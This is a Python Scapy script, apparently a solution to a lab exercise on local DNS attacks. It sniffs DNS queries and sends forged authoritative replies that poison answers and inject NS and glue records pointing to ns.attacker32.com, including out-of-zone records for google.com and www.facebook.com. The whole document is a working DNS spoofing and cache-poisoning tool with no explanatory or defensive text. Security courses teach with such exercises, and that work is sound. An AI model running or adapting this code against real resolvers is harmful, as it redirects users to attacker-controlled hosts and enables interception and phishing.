#!/usr/bin/env python3
import argparse
from scapy.all import DNS, DNSRR, IP, UDP, send, sniff

TARGET = "www.example.com."
SENT = False


def count_rr(record):
    if not record:
        return 0
    count = 0
    current = record
    while current:
        count += 1
        payload = getattr(current, "payload", None)
        if not isinstance(payload, DNSRR):
            break
        current = payload
    return count


def build_sections(task, qname):
    answer = DNSRR(rrname=qname, type="A", ttl=259200, rdata="1.2.3.5")
    if task == "task1" or task == "task2":
        return answer, None, None

    ns = DNSRR(rrname="example.com.", type="NS", ttl=259200, rdata="ns.attacker32.com.")
    if task == "task3":
        return answer, ns, None

    if task == "task4":
        google_ns = DNSRR(rrname="google.com.", type="NS", ttl=259200, rdata="ns.attacker32.com.")
        return answer, ns / google_ns, None

    ns2 = DNSRR(rrname="example.com.", type="NS", ttl=259200, rdata="ns.example.com.")
    add1 = DNSRR(rrname="ns.attacker32.com.", type="A", ttl=259200, rdata="1.2.3.4")
    add2 = DNSRR(rrname="ns.example.net.", type="A", ttl=259200, rdata="5.6.7.8")
    add3 = DNSRR(rrname="www.facebook.com.", type="A", ttl=259200, rdata="3.4.5.6")
    return answer, ns / ns2, add1 / add2 / add3


def spoof_dns(pkt, args):
    global SENT
    if DNS not in pkt or not getattr(pkt[DNS], "qd", None):
        return

    qname = pkt[DNS].qd.qname.decode("utf-8", errors="ignore")
    if qname != TARGET:
        return

    if args.task == "task1":
        if pkt[IP].src != "10.9.0.5" or pkt[IP].dst != "10.9.0.53":
            return
        src_ip, dst_ip = pkt[IP].dst, pkt[IP].src
    else:
        if pkt[IP].src != "10.9.0.53":
            return
        src_ip, dst_ip = pkt[IP].dst, pkt[IP].src

    answer, ns, ar = build_sections(args.task, pkt[DNS].qd.qname)
    dns = DNS(
        id=pkt[DNS].id,
        qd=pkt[DNS].qd,
        aa=1,
        rd=pkt[DNS].rd,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=count_rr(ns),
        arcount=count_rr(ar),
        an=answer,
        ns=ns,
        ar=ar,
    )
    packet = IP(dst=dst_ip, src=src_ip) / UDP(dport=pkt[UDP].sport, sport=53) / dns
    for _ in range(5):
        send(packet, verbose=0)
    print(f"[{args.task}] spoofed {qname} -> {dst_ip}")
    SENT = True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--task", required=True, choices=["task1", "task2", "task3", "task4", "task5"])
    parser.add_argument("--iface", required=True)
    parser.add_argument("--timeout", type=int, default=25)
    args = parser.parse_args()
    sniff(
        iface=args.iface,
        filter="udp and dst port 53",
        prn=lambda pkt: spoof_dns(pkt, args),
        store=0,
        timeout=args.timeout,
        stop_filter=lambda _: SENT,
    )


if __name__ == "__main__":
    main()
